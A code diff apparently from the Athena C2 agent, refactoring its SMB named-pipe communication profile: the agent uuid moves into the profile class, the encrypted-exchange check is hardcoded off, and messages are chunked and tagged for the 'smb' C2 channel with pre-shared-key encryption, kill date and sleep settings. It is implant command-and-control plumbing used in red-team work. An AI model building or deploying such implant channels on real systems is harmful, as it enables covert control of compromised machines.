@@ -14,17 +14,17 @@ using Athena.Models.Config;
 
 namespace Athena
 {
-    public class Config : IConfig
+    public class SMBConfig : IConfig
     {
         public IProfile profile { get; set; }
-        public static string uuid { get; set; }
+        //public string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
 
-        public Config()
+        public SMBConfig()
         {
-            uuid = "%UUID%";
+            //uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
@@ -37,12 +37,13 @@ namespace Athena
 
     public class Smb : IProfile
     {
+        public string uuid { get; set; }
         public string psk { get; set; }
         private PipeServer<DelegateMessage> serverPipe { get; set; }
         public string pipeName = "pipename";
         private bool connected { get; set; }
         public bool encrypted { get; set; }
-        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        public bool encryptedExchangeCheck = bool.Parse("false");
         public PSKCrypto crypt { get; set; }
         public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
@@ -51,12 +52,13 @@ namespace Athena
 
         public Smb()
         {
+            uuid = "%UUID%";
             this.connected = false;
             this.psk = "AESPSK";
             this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(Config.uuid, this.psk);
+                this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
@@ -137,7 +139,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Config.uuid + json);
+                    json = await Misc.Base64Encode(this.uuid + json);
                 }
 
                 DelegateMessage dm;
@@ -150,7 +152,7 @@ namespace Athena
                     {
                         dm = new DelegateMessage()
                         {
-                            uuid = Config.uuid,
+                            uuid = this.uuid,
                             message = part,
                             c2_profile = "smb",
                             final = true
@@ -160,7 +162,7 @@ namespace Athena
                     {
                         dm = new DelegateMessage()
                         {
-                            uuid = Config.uuid,
+                            uuid = this.uuid,
                             message = part,
                             c2_profile = "smb",
                             final = false
